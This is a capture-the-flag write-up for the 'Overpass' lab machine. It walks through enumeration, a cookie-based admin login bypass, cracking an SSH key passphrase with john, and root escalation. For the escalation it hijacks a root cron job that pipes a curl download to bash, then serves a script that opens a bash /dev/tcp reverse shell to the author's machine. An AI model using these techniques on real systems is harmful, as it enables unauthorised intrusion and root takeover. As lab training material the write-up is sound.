# Overpass - Easy

**IP : 10.10.137.51**

## Enumeration

### nmap - `nmap 10.10.137.51 -oN nmap-initial` 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### Manual scrolling through web-page

**Home page**

**`Your passwords are protected using Military Grade encryption.`**

Seems fishy.

Going through source page for web page we get this:

`<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->`

Hmmm....It's **ceaser** ain't it?

**About us**

```
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```
Maybe some usernames... well gonna find out soon

### gobuster - `gobuster dir -u http://10.10.137.51/ --wordlist ../common_wl.txt| tee gobuster-scan`

```
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]    
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]      
/index.html           (Status: 301) [Size: 0] [--> ./]        

```

**/admin** gotta check that.

Dummy data for sending login data through /admin page. Got this **/api/login** using **web dev tools** on firefox.

`curl -X POST http://10.10.137.51/api/login -d "username: 'admin', password: 'admin'"`

Tried some SQLi payloads. Looks like SQLi is not an option here....

Let's check the source code for this admin page.... Some JavaScript **/login.js** is being used. Let's see there.. so its sending data to **/api/login** we already have that. It's also setting some cookie... What happens if I manually change it?... Well I got login in!

`
Cookie_name: SessionToken
Cookie_Value: 1
`

How did I know it was 1.. well 0/1 usually stand for TRUE in most programming languages. The creators of this so called password vault are programmers... maybe they return 0 or 1. It was a total shot in dark I know.. but it worked... there's no harm (*atleast not for me :)* ).


We got ourselves in and a **ssh key for user james**. Saving it as james_key and running **ssh2john** so that john can find a key for it.

`python ssh2john james_key > hash`

Running **john the ripper** we get the passphrase: 

**NOTE TO SELF: IMPORTANT REMEMBER** `--wordlist=<dictionary_file>` **it should be as it is. It cannot be like** `--wordlist <dictionary_file>` *John is ruthless* 

`john hash --wordlist=rockyou.txt` 

**`Passphrase: james13`**

Let's login using ssh now.

`ssh -i james_key james@10.10.137.51`

We are in and we got outselves a **user.txt** file.

Running **LinPEAS**

`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`

`/etc/hosts is world writable`

Using the above combination we can get ourselves a reverse shell as root. Changing the IP for *overpass.thm* in /etc/hosts to out machine IP and running a server with exact directories.

Making a file **buildscript.sh** with following content will get us a reverse shell in a minute or so.

```
#!/bin/bash
bash -i >& /dev/tcp/<my_machine_ip>/<port> 0>&1
```


